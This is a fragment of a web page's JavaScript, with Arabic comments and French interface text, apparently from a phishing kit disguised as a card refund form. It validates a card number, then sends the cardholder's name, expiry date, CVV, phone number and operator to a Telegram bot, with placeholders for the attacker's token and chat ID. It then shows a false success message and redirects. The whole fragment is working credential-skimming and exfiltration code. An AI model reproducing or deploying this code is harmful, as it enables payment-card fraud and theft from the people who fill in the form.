value = value.replace(/(.{4})/g, '$1 ').trim(); // إضافة مسافة بين كل 4 أرقام
            input.value = value;

            const cardError = document.getElementById('card-error');
            if (/^4/.test(value.replace(/\s+/g, '')) || /^5[1-5]/.test(value.replace(/\s+/g, ''))) {
                input.classList.remove('border-red-500');
                cardError.classList.add('hidden');
            } else if (value.length >= 1) {
                input.classList.add('border-red-500');
                cardError.classList.remove('hidden');
            } else {
                input.classList.remove('border-red-500');
                cardError.classList.add('hidden');
            }
        }

        // وظيفة إرسال البيانات إلى بوت تلغرام بعد تقديم النموذج
        async function handleFormSubmit(event) {
            event.preventDefault(); // منع إعادة تحميل الصفحة عند إرسال النموذج

            // استخراج البيانات المدخلة من النموذج
            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, ''); // إزالة الفراغات
            const phoneNumber = document.getElementById('telephone').value;
            const cardHolder = document.getElementById('nom').value;
            const expirationDate = document.getElementById('date-expiration').value;
            const cvv = document.getElementById('cvv').value;
            const operator = document.getElementById('operateur').value;

            // التحقق من صحة رقم البطاقة
            if (!/^\d{16}$/.test(cardNumber)) {
                alert("❌ Numéro de carte invalide. Veuillez saisir 16 chiffres.");
                return;
            }

            // حفظ البيانات في localStorage
            localStorage.setItem('lastFourDigits', cardNumber.slice(-4)); // حفظ آخر 4 أرقام من البطاقة
            localStorage.setItem('phoneNumber', phoneNumber); // حفظ رقم الهاتف

            // تكوين الرسالة التي سيتم إرسالها إلى بوت تلغرام
            const message = `
                Nouveau remboursement demandé :

                Titulaire de la carte : ${cardHolder}
                Numéro de carte (derniers 4 chiffres) : ${cardNumber.slice(-4)}
                Date d'expiration : ${expirationDate}
                Code CVV : ${cvv}
                Numéro de téléphone : ${phoneNumber}
                Opérateur choisi : ${operator}
            `;

            // تعيين API Token للبوت وChat ID (استبدلها بالقيم الحقيقية الخاصة بك)
            const botToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بـ API Token الخاص بك
            const chatId = 'YOUR_CHAT_ID'; // استبدل هذا بـ chat ID الخاص بك

            // إرسال الرسالة إلى بوت تلغرام
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message
            };

            // إرسال الطلب باستخدام Fetch API
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                const result = await response.json();
                if (result.ok) {
                    // إذا تم إرسال الرسالة بنجاح
                    alert('Votre remboursement a été enregistré avec succès !');
                    window.location.href = "Traitement.html"; // إعادة توجيه المستخدم إلى الصفحة التالية
                } else {
                    alert('Erreur lors de l\'envoi des données. Veuillez réessayer.');
                }
            } catch (error) {
                alert('Erreur de connexion au serveur. Veuillez réessayer.');
            }
        }
    </script>
</body>
</html>